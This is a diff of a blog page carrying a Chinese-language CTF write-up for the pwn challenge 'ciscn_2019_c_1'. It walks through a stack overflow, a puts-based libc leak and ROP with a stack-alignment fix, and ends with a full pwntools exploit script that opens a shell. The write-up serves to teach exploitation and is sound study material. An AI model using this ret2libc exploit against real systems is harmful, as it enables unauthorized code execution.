@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息64位elf，开了NX  分析大概就是这样一个加解密程序，读取输入选择功能，encrypt读取用户输入，decrypt不可用   可以看出encrypt读取输入明显的溢出：  题目没有system和sh所以需要构造ROP。并且没有给出libc文件，但存在puts函数，可以用于leak。 所以就是leak出函数地址，确定libc，之后构造ROP exploitencrypt64位，puts函">
+    <meta name="description" content="题目信息64位elf，开了NX                                                                                                             分析大概就是这样一个加解密程序，读取输入选择功能，encrypt读取用户输入，decrypt不可用">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ciscn_2019_c_1">
 <meta property="og:url" content="https://darkwing.moe/2019/11/26/ciscn-2019-c-1/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息64位elf，开了NX  分析大概就是这样一个加解密程序，读取输入选择功能，encrypt读取用户输入，decrypt不可用   可以看出encrypt读取输入明显的溢出：  题目没有system和sh所以需要构造ROP。并且没有给出libc文件，但存在puts函数，可以用于leak。 所以就是leak出函数地址，确定libc，之后构造ROP exploitencrypt64位，puts函">
+<meta property="og:description" content="题目信息64位elf，开了NX                                                                                                             分析大概就是这样一个加解密程序，读取输入选择功能，encrypt读取用户输入，decrypt不可用">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112501.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112502.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112503.jpg">
@@ -128,7 +128,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -214,32 +214,99 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             <h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>64位elf，开了NX</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112501.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112501.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>大概就是这样一个加解密程序，读取输入选择功能，encrypt读取用户输入，decrypt不可用</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112502.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112503.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112502.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112503.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>可以看出encrypt读取输入明显的溢出：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112504.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112504.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>题目没有system和sh所以需要构造ROP。并且没有给出libc文件，但存在puts函数，可以用于leak。</p>
 <p>所以就是leak出函数地址，确定libc，之后构造ROP</p>
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><h2 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a>encrypt</h2><p>64位，puts函数一个参数，需要rdi寄存器的gadget，并且需要返回到开始位置：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112505.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112506.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112505.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112506.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <p>另外因为输入会经过encrypt，异或处理，所以二次异或会还原，即输入的payload要先经过一次处理：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dd</span><span class="params">(enc)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">        <span class="keyword">if</span> ord(enc[i]) &lt;= <span class="number">96</span> <span class="keyword">or</span> ord(enc[i]) &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> ord(enc[i]) &lt;= <span class="number">64</span> <span class="keyword">or</span> ord(enc[i]) &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> ord(enc[i]) &gt; <span class="number">47</span> <span class="keyword">or</span> ord(enc[i]) &lt;= <span class="number">57</span>:</span><br><span class="line">                    res += chr(ord(enc[i]) ^ <span class="number">0xf</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += chr(ord(enc[i]) ^ <span class="number">0xe</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += chr(ord(enc[i]) ^ <span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
 
 <p> 然后gdb对pattern处理可以算出偏移为88:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112604.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112604.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <p>不过实际打的时候不需要处理</p>
 <h2 id="几个坑"><a href="#几个坑" class="headerlink" title="几个坑"></a>几个坑</h2><p>exp很简单的，但有几个坑</p>
 <p>leak那里用puts不用gets，原因是gets匹配出的结果太多了</p>
 <p>然后，现在线上环境是18版本，直接拿网上流传的那些打的话会失败，因为那些是针对16版本的</p>
 <p>如果gdb attach跟一下的话，会发现是正常走到了system步骤，但之后会报这样一个错误：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112605.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112605.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>直接根据报错信息，能够搜到这篇文章：</p>
 <p>在一些64位的glibc的payload调用system函数失败问题 – Ex个人博客<br><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">http://blog.eonew.cn/archives/958</a></p>
 <p>自己跟进去的话，能够看到确实是栈没对齐，那很简单，多加个ret对齐，再找个ret的gadget就可以：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112606.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019112606.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"><span class="comment"># sh = remote('node3.buuoj.cn', 28271)</span></span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start = 0x400B28</span></span><br><span class="line">start = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">gets_got = elf.got[<span class="string">'gets'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'puts_plt =&gt; &#123;&#125;'</span>.format(hex(puts_plt)))</span><br><span class="line">log.success(<span class="string">'gets_got =&gt; &#123;&#125;'</span>.format(hex(gets_got)))</span><br><span class="line">log.success(<span class="string">'puts_got =&gt; &#123;&#125;'</span>.format(hex(puts_got)))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'choice!\n'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">88</span></span><br><span class="line">payload1 += p64(rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload1 += p64(start)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 = dd(payload1)</span></span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'@'</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line"></span><br><span class="line">puts_leak = u64(sh.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">log.success(<span class="string">'puts_leak_addr =&gt; &#123;&#125;'</span>.format(hex(puts_leak)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_leak)</span><br><span class="line">libc_base = puts_leak - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'libc_base_addr =&gt; &#123;&#125;'</span>.format(hex(libc_base)))</span><br><span class="line">log.success(<span class="string">'system_addr =&gt; &#123;&#125;'</span>.format(hex(sys_addr)))</span><br><span class="line">log.success(<span class="string">'bin_sh_addr =&gt; &#123;&#125;'</span>.format(hex(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'choice!\n'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">88</span></span><br><span class="line">payload2 += p64(<span class="number">0x4006b9</span>) <span class="comment"># add ret</span></span><br><span class="line">payload2 += p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
